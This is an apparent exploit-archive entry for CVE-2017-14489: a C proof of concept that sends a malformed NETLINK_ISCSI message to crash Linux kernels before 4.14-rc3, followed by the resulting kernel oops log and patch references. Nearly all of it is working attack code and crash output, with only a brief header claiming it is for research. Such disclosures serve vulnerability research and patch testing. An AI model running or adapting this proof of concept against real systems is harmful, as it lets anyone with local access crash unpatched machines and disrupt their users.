/*
# Exploit Title: Linux Kernel<4.14.rc3 Local Denial of Service
# Date: 2017-Oct-02
# Exploit Author: Wang Chenyu (Nanyang Technological University)
# Version:Linux kernel 4-14-rc1
# Tested on:Ubuntu 16.04 desktop amd64
# CVE : CVE-2017-14489
# CVE description: This CVE is assigned to Wang Chunyu (Red Hat) and
discovered by Syzkaller. Provided for legal security research and testing
purposes ONLY.
In this POC, skb_shinfo(SKB)->nr_frags was overwritten by ev->iferror = err
(0xff) in the condition where nlh->nlmsg_len==0x10 and skb->len >
nlh->nlmsg_len.


POC:
*/

#include <sys/socket.h>
#include <linux/netlink.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define NETLINK_USER 31

#define MAX_PAYLOAD 1024 /* maximum payload size*/
struct sockaddr_nl src_addr, dest_addr;
struct nlmsghdr *nlh = NULL;
struct iovec iov;
int sock_fd;
struct msghdr msg;

int main()
{
sock_fd=socket(PF_NETLINK, SOCK_RAW, NETLINK_ISCSI);
if(sock_fd<0)
return -1;

memset(&src_addr, 0, sizeof(src_addr));
src_addr.nl_family = AF_NETLINK;
src_addr.nl_pid = getpid(); /* self pid */

bind(sock_fd, (struct sockaddr*)&src_addr, sizeof(src_addr));

memset(&dest_addr, 0, sizeof(dest_addr));
memset(&dest_addr, 0, sizeof(dest_addr));
dest_addr.nl_family = AF_NETLINK;
dest_addr.nl_pid = 0; /* For Linux Kernel */
dest_addr.nl_groups = 0; /* unicast */

nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
nlh->nlmsg_len = 0xac;
nlh->nlmsg_pid = getpid();
nlh->nlmsg_flags = 0;

strcpy(NLMSG_DATA(nlh), "ABCDEFGHabcdefghABCDEFGHabcdef
ghABCDEFGHabcdefghABCDEFGHabcdefghABCDEFGHabcdefghABCDEFGHab
cdefghAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDD\x10");

iov.iov_base = (void *)nlh;
iov.iov_len = 0xc0;
msg.msg_name = (void *)&dest_addr;
msg.msg_namelen = sizeof(dest_addr);
msg.msg_iov = &iov;
msg.msg_iovlen = 1;

printf("Sending message to kernel\n");
sendmsg(sock_fd,&msg,0);
printf("Waiting for message from kernel\n");

/* Read message from kernel */
recvmsg(sock_fd, &msg, 0);
printf("Received message payload: %s\n", (char *)NLMSG_DATA(nlh));
close(sock_fd);
}


Crash info:
[   17.880629] BUG: unable to handle kernel NULL pointer dereference at
0000000000000028
[   17.881586] IP: skb_release_data+0x77/0x110
[   17.882093] PGD 7b02a067 P4D 7b02a067 PUD 7b02b067 PMD 0
[   17.882743] Oops: 0002 [#1] SMP
[   17.883123] Modules linked in:
[   17.883493] CPU: 1 PID: 2687 Comm: test02 Not tainted 4.14.0-rc1+ #1
[   17.884251] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
Ubuntu-1.8.2-1ubuntu1 04/01/2014
[   17.885350] task: ffff88007c5a1900 task.stack: ffffc90000e10000
[   17.886058] RIP: 0010:skb_release_data+0x77/0x110
[   17.886590] RSP: 0018:ffffc90000e13c08 EFLAGS: 00010202
[   17.887213] RAX: 000000000000000d RBX: ffff88007bd50300 RCX:
ffffffff820f96a0
[   17.888059] RDX: 000000000000000c RSI: 0000000000000010 RDI:
000000000000000c
[   17.888893] RBP: ffffc90000e13c20 R08: ffffffff820f9860 R09:
ffffc90000e13ad8
[   17.889712] R10: ffffea0001ef5400 R11: ffff88007d001700 R12:
0000000000000000
[   17.890349] R13: ffff88007be710c0 R14: 00000000000000c0 R15:
0000000000000000
[   17.890977] FS:  00007f7614d4c700(0000) GS:ffff88007fd00000(0000)
knlGS:0000000000000000
[   17.891592] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   17.892054] CR2: 0000000000000028 CR3: 000000007b022000 CR4:
00000000000006e0
[   17.892629] Call Trace:
[   17.892833]  skb_release_all+0x1f/0x30
[   17.893140]  consume_skb+0x27/0x90
[   17.893418]  netlink_unicast+0x16a/0x210
[   17.893735]  netlink_sendmsg+0x2a3/0x390
[   17.894050]  sock_sendmsg+0x33/0x40
[   17.894336]  ___sys_sendmsg+0x29e/0x2b0
[   17.894650]  ? __wake_up_common_lock+0x7a/0x90
[   17.895009]  ? __wake_up+0xe/0x10
[   17.895280]  ? tty_write_unlock+0x2c/0x30
[   17.895606]  ? tty_ldisc_deref+0x11/0x20
[   17.895925]  ? n_tty_open+0xd0/0xd0
[   17.896211]  ? __vfs_write+0x23/0x130
[   17.896512]  __sys_sendmsg+0x40/0x70
[   17.896805]  ? __sys_sendmsg+0x40/0x70
[   17.897133]  SyS_sendmsg+0xd/0x20
[   17.897408]  entry_SYSCALL_64_fastpath+0x13/0x94
[   17.897783] RIP: 0033:0x7f7614886320
[   17.898186] RSP: 002b:00007fff6f17f9c8 EFLAGS: 00000246 ORIG_RAX:
000000000000002e
[   17.898793] RAX: ffffffffffffffda RBX: 00007f7614b2e7a0 RCX:
00007f7614886320
[   17.899368] RDX: 0000000000000000 RSI: 0000000000600fc0 RDI:
0000000000000003
[   17.899943] RBP: 0000000000000053 R08: 00000000ffffffff R09:
0000000000000000
[   17.900521] R10: 0000000000000000 R11: 0000000000000246 R12:
0000000000400b9e
[   17.901095] R13: 00007f7614d50000 R14: 0000000000000019 R15:
0000000000400b9e
[   17.901672] Code: 45 31 e4 41 80 7d 02 00 48 89 fb 74 32 49 63 c4 48 83
c0 03 48 c1 e0 04 49 8b 7c 05 00 48 8b 47 20 48 8d 50 ff a8 01 48 0f 45 fa
<f0> ff 4f 1c 74 7a 41 0f b6 45 02 41 83 c4 01 44 39 e0 7f ce 49
[   17.903190] RIP: skb_release_data+0x77/0x110 RSP: ffffc90000e13c08
[   17.903689] CR2: 0000000000000028
[   17.903980] ---[ end trace 2f1926fbc1d32679 ]---


Reference:
[1] https://patchwork.kernel.org/patch/9923803/
[2] https://github.com/google/syzkaller